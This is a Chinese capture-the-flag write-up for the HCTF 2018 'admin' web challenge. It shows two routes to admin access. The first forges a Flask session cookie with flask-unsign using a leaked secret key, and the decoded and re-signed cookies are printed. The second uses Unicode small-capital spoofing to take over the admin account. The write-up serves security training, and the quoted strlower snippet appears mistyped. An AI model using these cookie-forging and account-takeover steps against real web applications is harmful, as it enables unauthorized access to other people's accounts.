# \[HCTF 2018]admin

## \[HCTF 2018]admin

## 考点

* flask session伪造
* Unicode欺骗

## wp

### 第一种做法

注册登录后，在change password处给了源码

![](<../../.gitbook/assets/image (1) (1) (1).png>)

打开可以看到是flask的源码，结合题目，可以判断要伪造admin。在config.py中找到`SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'`

然后就可以使用flask-unsign了

```
flask-unsign --decode --cookie .eJxFkMFuwjAQRH-l2jOH2JALEhfkYgVpbYXaidYXREMgcWwqB VAhiH9vWlXtHHekNzvzgO2hr88NzC_9tZ7Att3D_AEv7zAHjJZpaVPihUeJXAmb4rDqXMwTNaiA0t50uYlkcEa-mpIJgcqicRJTMlVCZt05gwyFa5V85WhyjkPFtVAN-ow5UbTKuKgGGu_rgGLjnbQM_apDs_QU6Y5-GXDIUhSrTvFsOmbftQhB-cIrmTEa8k803QKeE6jO_WF7-ejq03-FEm8Uv-NHVDm-I3JGPEtVtAmaTaPFPmhxnCpTzbRARiUyly9-cG3cHes_EpXszf46p10cDdiNgglcz3X_MxuwBJ5fW9tqTg.YkqrwA.DOP8oMc0Qa4fnCrwx4twEYRYRvY
```

得到的内容为

```
{'_fresh': True, '_id': b'2e58e9cec0c645931dfd473e0e19dfa38b77a9eaeadc9a74a2de3506b4a614637683a225d5b56f76632e04cde521d10cbf220e32901d7b7fd289e65c4b5c4019', 'csrf_token': b'1c1bfb4f21bdd45cb96e414a87e887578835ac5e', 'image': b'amRQ', 'name': 'aaaa', 'user_id': '10'}
```

在用`SECRET_KEY`重新加密

```
flask-unsign --sign --cookie "{'_fresh': True, '_id': b'2e58e9cec0c645931dfd473e0e19dfa38b77a9eaeadc9a74a2de3506b4a614637683a225d5b56f76632e04cde521d10cbf220e32901d7b7fd289e65c4b5c4019', 'csrf_token': b'1c1bfb4f21bdd45cb96e414a87e887578835ac5e', 'image': b'amRQ', 'name': 'aaaa', 'user_id': '10'}" --secret 'ckj123'
```

得到session，再用这个session访问index即可

```
.eJxFkF9rwjAUxb_KuM8-NNG-CL5IZqhwE-qSlpsXcbXapomDqkwrfvd1Y2yv58Dv_HnA9tDX5wbml_5aT2Db7mH-gJd3mANGy7S0KfHCo0SuhE1xWHUu5okaVEBpb7rcRDI4I19NyYRAZdE4iSmZKiGz7pxBhsK1Sr5yNDnHoeJaqAZ9xpwoWmVcVAON-jqg2HgnLUO_6tAsPUW6o18GHLIUxapTPJuO2XctQlC-8EpmjIb8E023gOcEqnN_2F4-uvr0P6HEG8Xv-BFVjnVEzohnqYo2QbNptNgHLY5TZaqZFsioRObyxQ-ujbtj_Ueikr3ZX-e0i6MBu31sTzCB67nuf34DlsDzC8rTatM.YkqtdA.cL66rcW3NKmN-aZXI_13u1zyH8g
```

### 第二种做法

使用Unicode欺骗。本题在获取参数时使用了自定义的strlower函数，nodeprep.prepare对应的库为[https://github.com/twisted/twisted](https://github.com/twisted/twisted)

```python
def strlower(username):
    pytusername = nodeprep.prepare(username)
    return username
```

nodeprep.prepare函数会把[Latin Letter Small Capital](https://unicode-table.com/en/1D00/)先转为大写再转为小写，即

```
ᴀ -> A -> a
```

那就可以先注册ᴀdmin，再修改密码，再以admin身份登录

## 小结

1. [一题三解之2018HCTF admin](https://www.anquanke.com/post/id/16408)
2. [从一道题深入mysql字符集与比对方法collation](https://skysec.top/2018/03/21/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E6%B7%B1%E5%85%A5mysql%E5%AD%97%E7%AC%A6%E9%9B%86%E4%B8%8E%E6%AF%94%E5%AF%B9%E6%96%B9%E6%B3%95collation/)
